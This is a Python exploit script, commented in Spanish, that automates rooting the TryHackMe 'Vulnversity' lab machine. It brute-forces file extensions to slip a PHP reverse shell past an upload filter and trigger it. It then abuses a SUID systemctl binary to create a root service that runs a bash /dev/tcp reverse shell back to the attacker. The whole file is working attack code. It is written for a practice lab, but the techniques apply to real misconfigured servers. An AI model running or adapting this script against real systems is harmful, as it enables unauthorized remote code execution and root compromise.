#!/usr/bin/python3

# Autor:        ErickBuster
# Maquina:	Vulnversity - Try Hack Me
# Descripcion:
# 	General: 	Automatiza la intrusion para la Maquina Vulnversity ganando acceso como root
# 	Particular: 	Sube una reverse shell en php con fuerza bruta cambiando la extension del archivo, una vez subido hara una ejecucion remota de comandos
#			aprovechandose de un SUID del servicio systemctl para escalar privilegios como root

'''
Uso:
	> python3 Vulnversity_exploit.py -r <rhost> -l <lhost>
	> nc -lvnp 443
'''
import signal
import sys
import requests
import os
import time
import threading
import socket
import subprocess
from pwn import *
#Salir del programa
def def_exit(sig, frame):
	print("\n[+]Saliendo...\n")
	sys.exit(1)
#Ctrl+c
signal.signal(signal.SIGINT, def_exit)
#VARIABLES GLOBALES
rhost = ""
lhost = ""
lportR = 443	#puerto en escucha por nc
rport = 3333
lport = 1234	#puerto del reverse shell
#FUNCIONES
def usage(): #Uso
	print("[*] python3 reverse_shell_VulnUniversity.py <rhost> <lhost>")
	print("[*] nc -lvp 443")
def cp_reverse(): #copiando reverse_shell.php
	os.system("cp /usr/share/webshells/php/php-reverse-shell.php .")
	os.system(f"sed 's/127.0.0.1/{lhost}/1' php-reverse-shell.php > reverse.php")
	os.system("rm php-reverse-shell.php")
def priv_root(): #elevado privilegios
	service = "UP=$(mktemp).service"
	bash_shell = f'\"bash -i >& /dev/tcp/{lhost}/{lportR} 0>&1\"'
	systemfile = f"echo '[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c {bash_shell}\n[Install]\nWantedBy=multi-user.target\' > $UP"
	up = "systemctl link \$UP"
	up2 = "systemctl enable --now $UP"
	shell.sendline(service.encode())
	shell.sendline(systemfile.encode())
	shell.sendline(up.encode())
	shell.sendline(up2.encode())
	time.sleep(1)
	shell.close()
def def_upload(): #subida de archivos
	url = f'http://{rhost}:{rport}/internal/index.php'
	url_get = f"http://{rhost}:{rport}/internal/uploads/"
	extension = [".php", ".php3",".php4",".php5",".phtml"]
	file = 'reverse'
	file_ext = file + ".php"
	time.sleep(2)
	p2 = log.progress("Intentado subir el archivo...\n")
	for e in extension:
		file_new = file + e
		os.rename(file_ext, file_new)
		r = requests.post(url,files={'file':open(file_new,'rb')})
		if 'Extension not allowed' in r.text:
			p2.status(f"{file_new} fallido")
		else:
			p2.success(f"{file_new} subido con exito")
			os.system(f"rm {file_new}")
			log.progress(f"Ejecutando el archivo {file}{e}")
			r = requests.get(url_get + file + e)
			return
		file_ext = file_new
	os.system(f"rm {file_ext}")
	p2.failure("No se pudo subir el archivo...")
def _root():
	os.system(f'sudo nc -nlvp {lportR}')
#MAIN
if __name__ == '__main__':
	if(len(sys.argv) < 3):
		usage()
	else:
		rhost = sys.argv[1]
		lhost = sys.argv[2]
		cp_reverse()
		p1 = log.progress("Comprometiendo Web\n")
		p1.status("Subiendo reverse shell...")
		try:
			exploit = threading.Thread(target=def_upload, args=()).start()
		except Exception as e:
			log.error(str(e))
		shell = listen(lport, timeout = 20).wait_for_connection()
		if shell.sock is None:
			p1.failure("Fallo al crear la sesion...")
			sys.exit(1)
		else:
			p1.success("Conexion reversa exitosamente!!.\n")
			p3 = log.progress("Escalando privilegios...\n")
			time.sleep(2)
			p3.status("regresando shell")
			priv_root()
			p3.success("Terminado!!!")
